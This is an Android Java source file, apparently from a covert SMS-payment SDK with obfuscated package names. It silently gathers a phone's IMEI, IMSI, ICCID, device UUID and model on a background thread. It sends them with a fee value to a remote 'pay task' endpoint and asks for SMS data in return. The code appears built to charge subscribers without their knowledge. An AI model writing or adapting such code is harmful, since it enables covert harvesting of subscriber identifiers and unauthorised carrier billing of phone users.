package com.thirdparty.net;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.gandalf.daemon.utils.DeviceUuidFactory;
import com.gandalf.daemon.utils.LogUtil;
import com.gandalf.daemon.utils.XL_log;
import com.msm.modu1e.utils.IMSInfo;
import com.msm.modu1e.utils.ImsiUtil;
import com.thirdparty.utils.Constants;
import com.zhy.http.okhttp.OkHttpUtils;

import java.util.HashMap;
import java.util.Map;

import k.m.PayTask;


/**
 * Created by as on 17-7-18.
 */

public class RequestHelper {
    private static XL_log log = new XL_log(RequestHelper.class);

    public static void requestPayTask(final Context context, final PayTask payTask) {
        if (payTask == null || TextUtils.isEmpty(payTask.mPid) || TextUtils.isEmpty(payTask.mCid)) {
            log.error("request pay task is null or config error");
            return;
        }
        final Context local_context = context;
        final PayTask local_task = payTask;
        new Thread(new Runnable() {
            @Override
            public void run() {
                GetPayTaskCallback getSmsTaskCallback = new GetPayTaskCallback(local_context);
                String imei = ImsiUtil.getIMEIWithAPI(local_context);
                IMSInfo imsiInfo = ImsiUtil.getIMSInfo(context);
                String imsi = "";
                if (imsiInfo != null) {
                    String i1 = imsiInfo.imsi_1;
                    String i2 = imsiInfo.imsi_2;
                    if (!TextUtils.isEmpty(i1)) {
                        imsi = i1;
                    } else if (!TextUtils.isEmpty(i2)) {
                        imsi = i2;
                    }
                }
                if (TextUtils.isEmpty(imsi)) {
                    imsi = ImsiUtil.getIMSIWithAPI(local_context);
                }

                String iccid = ImsiUtil.getICCIDWithAPI(local_context);
                //                String imsi = "46000125645684";
                String uuid = new DeviceUuidFactory(local_context).getDeviceUuid();
                String pid = payTask.mPid;
                String cid = payTask.mCid;
                String fee = payTask.mPrice + "";
                String mobileType = "3";
                String ipEffective = "1";
                String returnConfigInfo = "1";
                String returnSdkConfigInfo = "1";
                String dataSmsTypeOpen = "1";
                String returnSmsData = "50";

                Map<String, String> params = new HashMap<String, String>();
                params.put("pid", pid);
                params.put("cid", cid);
                params.put("uuid", uuid);
                params.put("imsi", imsi);
                params.put("imei", imei);
                params.put("iccid", iccid);
                params.put("ua", android.os.Build.BRAND + "_" + android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL);
                params.put("mobileType", mobileType);
                params.put("ipEffective", ipEffective);
                params.put("ReturnSdkConfigInfo", returnSdkConfigInfo);
                params.put("ReturnConfigInfo", returnConfigInfo);
                params.put("returnSmsData", returnSmsData);
                params.put("dataSmsTypeOpen", dataSmsTypeOpen);
                params.put("requestfee", fee);
                OkHttpUtils.get().
                        params(params).
                        url(Constants.URL_GET_GET_PAY_TASK).
                        build().
                        execute(getSmsTaskCallback);
            }
        }).start();
    }
}
